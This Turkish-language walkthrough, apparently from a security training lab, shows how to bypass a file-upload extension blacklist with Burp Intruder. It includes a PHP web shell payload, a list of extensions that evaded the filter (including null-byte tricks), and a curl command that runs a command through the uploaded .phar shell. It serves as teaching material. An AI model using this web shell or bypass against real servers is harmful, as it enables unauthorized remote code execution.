# Bypassing Blacklist Filters

Kara listede olmayan bir dosya uzantısı bulmak için Burp Intruder kullanılacak.

Dosya uzantısı, Add § ile payload noktası olarak seçilir:

```http title="Request" hl_lines="17"
POST /upload.php HTTP/1.1
Host: 94.237.51.163:31094
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundary3dbef11d2588bce7914bfbc0818f7574
Content-Length: 256
Origin: http://94.237.51.163:31094
Sec-GPC: 1
Connection: keep-alive
Referer: http://94.237.51.163:31094/
Priority: u=0

------geckoformboundary3dbef11d2588bce7914bfbc0818f7574
Content-Disposition: form-data; name="uploadFile"; filename="shell§.php§"
Content-Type: application/x-php


<?php system($_GET["cmd"]); ?>

------geckoformboundary3dbef11d2588bce7914bfbc0818f7574--
```

1. Payloads altında, Payload type için Simple list seçilir.
2. Payloads altında, Payload configuration için Load ile [extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) wordlist yüklenir.
3. Payloads altında, Payload encoding için URL-encode these characters seçeneği devre dışı bırakılır.

Saldırı, Start attack ile başlatılır.

Başarılı bir saldırı, aşağıdaki gibi bir yanıt ile sonuçlanır:

```http title="Response" hl_lines="9"
HTTP/1.1 200 OK
Date: Mon, 28 Apr 2025 10:37:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 26
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

File successfully uploaded
```

Aşağıda verilen tablo, başarı ile sonuçlanan dosya uzantılarını gösterir:

| REQUEST | PAYLOAD | LENGTH |
|---|---|---|
| 6 | .php4 | 230 |
| 10 | .pht | 230 |
| 12 | .phpt | 230 |
| 15 | .phtm | 230 |
| 16 | .php%00.gif | 230 |
| 17 | .php\x00.gif | 230 |
| 18 | .php%00.png | 230 |
| 19 | .php\x00.png | 230 |
| 20 | .php%00.jpg | 230 |
| 21 | .php\x00.jpg | 230 |
| 5 | .php3 | 229 |
| 9 | .php8 | 229 |
| 11 | .phar | 229 |
| 13 | .pgif | 229 |

Örneğin, .phar dosya uzantısını deneyelim:

```sh
my@attack:~$ curl -s 'http://94.237.51.163:31094/profile_images/shell.phar?cmd=id'
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
